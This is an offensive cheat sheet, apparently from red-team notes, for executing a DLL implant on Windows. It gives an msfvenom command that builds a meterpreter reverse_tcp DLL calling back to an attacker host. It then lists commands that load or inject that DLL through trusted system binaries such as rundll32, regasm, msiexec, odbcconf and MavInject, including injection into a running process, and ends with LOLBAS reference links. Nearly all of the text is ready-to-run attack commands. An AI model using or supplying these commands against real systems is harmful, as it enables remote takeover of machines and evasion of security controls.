# DLL Execution

Generate a DLL implant.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
```

## Rundll32

```
C:\> rundll32.exe implant.dll,StartW
```

## Regasm

Loads the target .DLL file and executes the RegisterClass function.

```
C:\> regasm.exe AllTheThingsx64.dll
```

Loads the target .DLL file and executes the UnRegisterClass function.

```
regasm.exe /U AllTheThingsx64.dll
```

## Regsvcs

```
C:\> regsvcs.exe AllTheThingsx64.dll
```

## Msiexec

```
C:\> msiexec /y "C:\path\to\implant.dll"
```

## odbcconf

```
C:\> odbcconf /a {REGSVR C:\path\to\implant.dll}
```

## MavInject

Inject DLL implant in a process ID.

```
C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\implant.dll
```

---
## References

- [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)

- [LOLBAS: Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)

- [LOLBAS: Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

- [LOLBAS: Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)

- [LOLBAS: Mavinject](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)

https://lolbas-project.github.io/lolbas/Libraries/Advpack/

https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/

https://lolbas-project.github.io/lolbas/Binaries/Certoc